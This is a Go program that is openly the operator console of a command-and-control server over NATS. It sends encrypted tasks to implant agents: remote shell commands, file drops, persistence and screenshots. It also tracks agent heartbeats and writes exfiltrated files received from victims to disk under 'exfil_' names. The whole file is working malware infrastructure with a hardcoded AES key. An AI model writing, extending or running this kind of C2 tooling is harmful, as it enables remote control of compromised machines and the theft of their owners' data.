package main

import (
    "bufio"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io"
    "os"
    "strings"
    "time"

    "github.com/nats-io/nats.go"
)

const b64Key = "rAEUBb5Id9HO3m3BZ+G5PSqBaceVJly4lbjbSSImz+c="
var aesKey []byte
var nc *nats.Conn
var natsURL = "nats://localhost:4222"

func encrypt(plaintext []byte) ([]byte, error) {
    block, _ := aes.NewCipher(aesKey)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
    block, _ := aes.NewCipher(aesKey)
    gcm, _ := cipher.NewGCM(block)
    nonceSize := gcm.NonceSize()
    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}

func publishTask(agent, cmd string) {
    encCmd, _ := encrypt([]byte(cmd))
    nc.Publish("c2."+agent+".tasks", encCmd)
}

func main() {
    var err error
    aesKey, _ = base64.StdEncoding.DecodeString(b64Key)

    // Try JWT auth if creds exist
    if _, err := os.Stat("implant.creds"); err == nil {
        nc, err = nats.Connect(natsURL, nats.UserCredentials("implant.creds"))
    } else {
        nc, err = nats.Connect(natsURL)
    }
    
    if err != nil {
        panic(err)
    }
    defer nc.Drain()

    heartbeats := make(map[string]time.Time)

    nc.Subscribe("c2.*.heartbeat", func(m *nats.Msg) {
        dec, err := decrypt(m.Data)
        if err == nil && string(dec) == "online" {
            agent := strings.Split(m.Subject, ".")[1]
            heartbeats[agent] = time.Now()
        }
    })

    nc.Subscribe("c2.*.results", func(m *nats.Msg) {
        dec, _ := decrypt(m.Data)
        agent := strings.Split(m.Subject, ".")[1]
        fmt.Printf("\n[+] Result from %s:\n%s\n> ", agent, string(dec))
    })

    nc.Subscribe("c2.*.file_upload", func(m *nats.Msg) {
        b64data := string(m.Data)
        encData, _ := base64.StdEncoding.DecodeString(b64data)
        decData, _ := decrypt(encData)
        agent := strings.Split(m.Subject, ".")[1]
        filename := fmt.Sprintf("exfil_%s_%d.bin", agent, time.Now().Unix())
        os.WriteFile(filename, decData, 0644)
        fmt.Printf("\n[!] File saved: %s\n> ", filename)
    })

    fmt.Println("[*] NATS C2 Operator Ready")
    fmt.Println("Commands: list, <agent> shell <cmd>, <agent> upload <local_file>, <agent> persist, <agent> screenshot, exit")

    scanner := bufio.NewScanner(os.Stdin)
    for {
        fmt.Print("> ")
        if !scanner.Scan() {
            break
        }
        line := scanner.Text()
        parts := strings.Fields(line)
        if len(parts) == 0 {
            continue
        }
        
        switch parts[0] {
        case "exit":
            return
        case "list":
            fmt.Println("Active agents:")
            for agent, ts := range heartbeats {
                if time.Since(ts) < 90*time.Second {
                    fmt.Println(" -", agent)
                }
            }
        default:
            if len(parts) < 2 {
                fmt.Println("Usage: <agent> <command> [args]")
                continue
            }
            agent := parts[0]
            cmd := parts[1]
            args := strings.Join(parts[2:], " ")

            switch cmd {
            case "shell":
                if args == "" {
                    fmt.Println("Usage: shell <command>")
                    continue
                }
                publishTask(agent, "shell "+args)
            case "upload":
                if args == "" {
                    fmt.Println("Usage: upload <local_file>")
                    continue
                }
                data, err := os.ReadFile(args)
                if err != nil {
                    fmt.Println("Error reading file:", err)
                    continue
                }
                encData, _ := encrypt(data)
                b64enc := base64.StdEncoding.EncodeToString(encData)
                publishTask(agent, fmt.Sprintf("download %s %s", args, b64enc))
            case "persist":
                publishTask(agent, "persist")
            case "screenshot":
                publishTask(agent, "screenshot")
            default:
                fmt.Println("Unknown command")
            }
        }
    }
}
